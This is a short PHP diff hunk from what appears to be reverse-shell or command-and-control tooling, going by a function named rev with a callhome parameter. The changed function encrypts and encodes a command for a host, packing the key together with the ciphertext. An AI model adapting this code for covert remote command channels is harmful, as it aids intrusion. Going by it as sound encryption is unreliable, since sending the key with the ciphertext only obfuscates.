@@ -459,14 +459,14 @@ function rev($host, $port, $method, $callhome)
 function co($command, $host, bool $encrypt)
 {
     if ($encrypt === true && !is_null($command)) {
-        $our_nonce = openssl_random_pseudo_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
-        $secure_Key = openssl_random_pseudo_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_KEYBYTES);
-        $additionalData = openssl_random_pseudo_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_ABYTES);
+        $our_nonce = openssl_random_pseudo_bytes(24);
+        $secure_Key = openssl_random_pseudo_bytes(32);
+        $additionalData = openssl_random_pseudo_bytes(16);
         try {
             $un = base64_encode(serialize($command));
             $ct = sodium_crypto_aead_xchacha20poly1305_ietf_encrypt($un, $additionalData, $our_nonce, $secure_Key);
             $cr = "2";
-            $space_Safe_coms = base64_encode(bin2hex($our_nonce) . "." . bin2hex($secure_Key) . "." . bin2hex($additionalData) . "." . base64_encode($ct));
+            $space_Safe_coms = base64_encode(bin2hex($our_nonce) . "." . bin2hex($secure_Key) . "." . bin2hex($additionalData) . "." . bin2hex($ct));
         } catch (SodiumException $exception) {
             echo $exception->getMessage();
             echo $exception->getTraceAsString();
